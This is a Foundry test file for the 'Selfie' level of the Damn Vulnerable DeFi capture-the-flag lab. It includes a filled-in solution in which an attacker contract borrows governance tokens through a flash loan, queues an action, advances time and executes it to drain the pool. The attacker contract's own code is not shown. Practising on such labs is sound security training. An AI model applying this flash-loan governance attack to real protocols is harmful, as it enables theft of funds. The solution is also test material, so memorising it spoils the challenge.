// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "src/DamnValuableVotes.sol";
import {SimpleGovernance} from "src/SimpleGovernance.sol";
import {SelfiePool} from "src/SelfiePool.sol";
import {Attacker} from "src/Attacker.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(governance, pool, token); //create attacker contract
        attacker.attack(); //call pool flashloan function
        vm.warp(block.timestamp + 2 days); //warp time by 2 days
        vm.roll(block.number + 3); //roll block by 3
        attacker.executeAction(1); //execute action
        attacker.withdraw(recovery); //send tokens to recovery address
    }

    // function test_attack() public {
    //     Attacker attacker = new Attacker(governance, pool, token);
    //     attacker.attack();
    //     console.log("Attacker balance: %s", token.balanceOf(address(attacker)));
    //     console.log("Pool balance: %s", token.balanceOf(address(pool)));
    //     uint256 counter = governance.getActionCounter();
    //     console.log("Action counter: %s", counter);
    //     vm.warp(block.timestamp + 2 days);
    //     vm.roll(block.number + 3);
    //     attacker.executeAction(1);
    //     console.log("Attacker balance: %s", token.balanceOf(address(attacker)));
    //     console.log("Pool balance: %s", token.balanceOf(address(pool)));
    //     attacker.withdraw(recovery);
    //     console.log("Recovery balance: %s", token.balanceOf(recovery));
    //     console.log("Attacker balance: %s", token.balanceOf(address(attacker)));
    //     console.log("Pool balance: %s", token.balanceOf(address(pool)));
    // }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
